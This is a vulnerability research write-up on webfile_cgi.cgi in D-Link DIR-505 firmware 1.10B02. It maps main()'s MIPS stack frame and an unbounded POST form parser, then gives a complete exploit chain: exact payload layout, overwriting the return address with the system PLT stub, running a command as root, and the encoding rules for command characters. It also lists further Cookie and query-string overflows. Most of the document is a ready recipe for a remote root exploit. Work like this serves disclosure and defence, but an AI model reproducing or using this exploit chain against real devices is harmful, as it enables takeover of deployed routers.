# Stack Layout and Exploit Chain Analysis — webfile_cgi.cgi (DIR-505 A1 1.10B02)

Binary: `/usr/bin/webfile_cgi.cgi`
- ELF 32-bit MIPS big-endian, `EXEC` (non-PIE), linked against uClibc 0.9.30
- MD5 `28cb86cc8b93ba2e4a47c6261403b5ce`, 64,872 bytes
- Key functions:
  - `main`                0x409000
  - `get_input_entries`   0x408e3c   (POST form parser)
  - `get_ws_entries`      0x408bec   (GET query parser)
  - `check_4session_uid`  0x402e50   (Cookie/session validation)
  - `replace_special_char` 0x40318c  (value post-processing, %xx decoding)
  - `.system` PLT stub    0x40d180   (`lw $t9,-0x7ff0($gp); move $t7,$ra; jalr $t9; li $t8,0x9c`)

## 1. main() stack frame

```
addiu $sp, $sp, -0x7ff0
sw $ra, 0x7fec($sp)   ->  final sp+0xCF7C
sw $s4, 0x7fe8($sp)   ->  sp+0xCF78
sw $s3, 0x7fe4($sp)   ->  sp+0xCF74
sw $s2, 0x7fe0($sp)   ->  sp+0xCF70
sw $s1, 0x7fdc($sp)   ->  sp+0xCF6C
sw $s0, 0x7fd8($sp)   ->  sp+0xCF68
addiu $sp, $sp, -0x4f90        (total frame 0xCF80)
```

- `v16[5]` (WS_ACTION copy) at sp+0x18
- `v17[53052]` (form parsing buffer) at sp+0x2C, ends at sp+0xCF68
- Relative to the start of `v17`: `$s0` +53052, `$s1` +53056, `$s2` +53060,
  `$s3` +53064, `$s4` +53068, **`$ra` +53072**

## 2. The get_input_entries() parser

```
entry = 0; pos = 0; invalue = 0;
while (len-- > 0) {
    c = getc(stdin);
    if (c == '=')      { pos = 0; invalue = 1; }
    else if (c == '&') { entry++; pos = 0; invalue = 0; }
    else {
        if (invalue) buf[1061*entry + 36 + pos] = c;
        else         buf[1061*entry +      pos] = c;
        pos++;
    }
}
```

No bounds on `entry` or `pos` -> overwrites main()'s stack frame.

## 3. Exploit data layout (entry 49)

- 49 x `&` -> entry = 49
- key base = 1061*49 = 51989 (`a`)
- value base = 51989 + 36 = 52025
- `$s0..$ra` map to value indexes 1027..1050 -> the value needs at least 1051 bytes

```
body = "x=0<cmd>"  +  "&"*49  +  "a="  +  value[1051]
value = [0x00] + ['A']*1026 + [$s0][$s1][$s2][$s3][$s4][$ra]
```

- `value[0] = 0x00`: makes `replace_special_char()` (which copies the value into a 1028-byte
  stack buffer) return immediately, preventing its own overflow from corrupting the layout.
- First field `x=0<cmd>`: at `main`'s return, `$a0 = &v17[36] + 1` (uClibc `strcmp` increments
  `$a0` in the branch delay slot), which points exactly at the `<cmd>` string.

## 4. Hijack and command execution

- `$ra = 0x40d180` (.system PLT stub)
- `main`'s epilogue: `lw $ra...; addiu $sp...; jr $ra` -> enters the stub
- The stub resolves `system` through the CGI's own `$gp` (lazy binding) and calls it
- `system($a0)` = `system(<cmd>)`, executed as **root**

## 5. Command character constraints

| Char | Reason | Encoding |
|---|---|---|
| `&` | form field separator (parser split/reset) | `%26` |
| `=` | value-start reset (v5=0, overwrites field head) | `%3D` |
| `%` | escape prefix for `replace_special_char` | `%25` |

`replace_special_char` decoding table (25 entries): space, `"`, `#`, `$`, `%`, `&`, `+`, `,`,
`/`, `:`, `;`, `<`, `=`, `>`, `?`, `@`, `[`, `\`, `]`, `^`, `` ` ``, `{`, `|`, `}`, `~`.

## 6. Secondary overflows (same binary)

- `get_ws_entries`: `strcpy(v15[1024], QUERY_STRING)`; `decode()` output into `v16[1024]`.
  A GET query value larger than ~1024 bytes overwrites the saved registers (crash demonstrated).
- `check_4session_uid`: `strcpy(&v14, getenv("Cookie"))`; a Cookie larger than ~10588 bytes
  overwrites `$ra` (boundary verified: 10500 -> normal, 10600 -> crash). Same class as
  CVE-2016-5681; never fixed for the DIR-505.
- `replace_special_char`: values larger than 1028 bytes are copied into `v16[1028]` (overflow);
  the exploit avoids it with the leading NUL byte.
